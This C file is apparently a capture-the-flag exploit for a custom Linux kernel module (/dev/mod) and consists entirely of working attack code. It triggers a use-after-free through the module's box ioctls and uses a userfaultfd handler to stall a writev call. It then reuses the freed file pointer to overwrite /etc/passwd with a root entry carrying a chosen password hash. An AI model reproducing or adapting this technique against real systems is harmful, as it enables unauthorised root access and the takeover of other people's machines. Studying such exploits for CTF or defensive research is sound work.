// gcc -static exp.c -o exp -lpthread

#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/uio.h>
#include <linux/userfaultfd.h>
#include <sys/mman.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <linux/kcmp.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sched.h>
#include <errno.h>
#include <poll.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE);   \
  } while (0)

#define FD_MAX 0x100

#define IOCTL_NEW_BOX 0x1337
#define IOCTL_UNLOCK_BOX 0x1338
#define IOCTL_LOCK_BOX 0x1339
#define IOCTL_DELETE_BOX 0x133a
#define IOCTL_SET_BOX 0x133b

int box_new(int fd,int key){
  return ioctl(fd,IOCTL_NEW_BOX,&key);
}

int unlock_box(int fd){
  return ioctl(fd,IOCTL_UNLOCK_BOX,NULL);
}

int lock_box(int fd){
  return ioctl(fd,IOCTL_LOCK_BOX,NULL);
}

int delete_box(int fd){
  return ioctl(fd,IOCTL_DELETE_BOX,NULL);
}

int set_box(int fd,int boxfd){
  return ioctl(fd,IOCTL_SET_BOX,&boxfd);
}


char cmd[] = "root:RgkDZgEJb.W/E:0:0:root:/root:/bin/sh\nuser:x:1000:1000:Linux User,,,:/home/user:/bin/sh";

int uaf_fd;
int mod_fd;

void pwn(){

  int uaf_dup;
  printf("[*] pwning ...\n");
  int box = box_new(mod_fd,0x1337);
  printf("[*] new_box : %x \n",box);

  // trigger uaf
  printf("[*] trigger uaf\n");
  set_box(mod_fd,box);

  uaf_dup = dup2(uaf_fd,box);
  
  box = box_new(mod_fd,0x1337);
  // trigger uaf
  set_box(mod_fd,box);
  close(uaf_dup);



  int i = 0;
  int ro_fd[FD_MAX];
  bool up = true;
  while(1){
    if(up){
        ro_fd[i] = open("/etc/passwd",O_RDONLY);
        if (ro_fd[i] == -1)
        errExit("open(ro file)");
        if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, ro_fd[i]) == 0)
        {
            printf("[*] got pointer reuse :\n\tuaf_box : %d\n\tro_fd : %d\n",uaf_fd,ro_fd[i]);
            break;
        }
        i++;
        if(i==FD_MAX) up=false;
    }
    else {
      close(ro_fd[i]);
      ro_fd[i--]= 0;
      if(i==0) up=true;
    }
  }

  return ;

}

static void *
fault_handler_thread(void *arg)
{
    static struct uffd_msg msg;   /* Data read from userfaultfd */
    long uffd;                    /* userfaultfd file descriptor */
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    /* Create a page that will be copied into the faulting region */

    if (page == NULL) {
        page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (page == MAP_FAILED)
            errExit("mmap");
    }

    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    if (nready == -1)
        errExit("poll");

    printf("\nfault_handler_thread():\n");
    printf("    poll() returns: nready = %d; "
            "POLLIN = %d; POLLERR = %d\n", nready,
            (pollfd.revents & POLLIN) != 0,
            (pollfd.revents & POLLERR) != 0);

    /* Read an event from the userfaultfd */

    nread = read(uffd, &msg, sizeof(msg));
    if (nread == 0) {
        printf("EOF on userfaultfd!\n");
        exit(EXIT_FAILURE);
    }

    if (nread == -1)
        errExit("read");

    /* We expect only one kind of event; verify that assumption */

    if (msg.event != UFFD_EVENT_PAGEFAULT) {
        fprintf(stderr, "Unexpected event on userfaultfd\n");
        exit(EXIT_FAILURE);
    }

    /* Display info about the page-fault event */

    printf("    UFFD_EVENT_PAGEFAULT event: ");
    printf("flags = %llx; ", msg.arg.pagefault.flags);
    printf("address = %llx\n", msg.arg.pagefault.address);


    pwn();
    
    /* Copy the page pointed to by 'page' into the faulting
        region. Vary the contents that are copied in, so that it
        is more obvious that each fault is handled separately. */

    /* long length; */
    /* FILE * f = fopen ("/suid", "rb"); */
    /* fseek (f, 0, SEEK_END); */
    /* length = ftell (f); */
    /* fseek (f, 0, SEEK_SET); */
    /* char buffer[length]; */
    /* fread (buffer, 1, length, f); */
    /* fclose (f); */

    struct iovec iov = { .iov_base = cmd, .iov_len = sizeof(cmd) };
    memcpy(page,&iov,sizeof(iov));

    uffdio_copy.src = (unsigned long) page;

    /* We need to handle page faults in units of pages(!).
        So, round faulting address down to page boundary */

    uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                        ~(0x1000 - 1);
    uffdio_copy.len = 0x1000;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        errExit("ioctl(UFFDIO_COPY)");

    printf("\tuffdio_copy.copy returned %lld\n",
            uffdio_copy.copy);


    return NULL;
}


void * init_userfaltfd(){
    long uffd;          /* userfaultfd file descriptor */
    char *addr;         /* Start of region handled by userfaultfd */
    pthread_t thr;      /* ID of thread that handles page faults */
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    printf("[*] userfaltfd : %ld\n",uffd);

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    /* Create a private anonymous mapping. The memory will be
        demand-zero paged--that is, not yet allocated. When we
        actually touch the memory, it will be allocated via
        the userfaultfd. */

    addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
        errExit("mmap");

    printf("[*] mmap() : %p\n", addr);

    /* Register the memory range of the mapping we just created for
        handling by the userfaultfd object. In mode, we request to track
        missing pages (i.e., pages that have not yet been faulted in). */

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = 0x1000;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    
    /* Create a thread that will process the userfaultfd events */

    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
    if (s != 0) {
        errno = s;
        errExit("pthread_create");
    }

    return addr;
}


int main()
{

  mod_fd = open("/dev/mod", O_RDWR);
  if(mod_fd == -1)  errExit("open(/dev/mod)");

  int box = box_new(mod_fd,0x1337);
  printf("[*] box_new : %x \n",box);
  set_box(mod_fd,box);
  close(box);

  uaf_fd = open("/home/user/ll", O_RDWR | O_CREAT);
  printf("uaf_fd : %x \n",uaf_fd);

  struct iovec  * iov = (struct iovec  *) init_userfaltfd();
  ssize_t writev_res = writev(uaf_fd,iov, 1);

  printf("[*] writev return : %lx\n",writev_res);
}
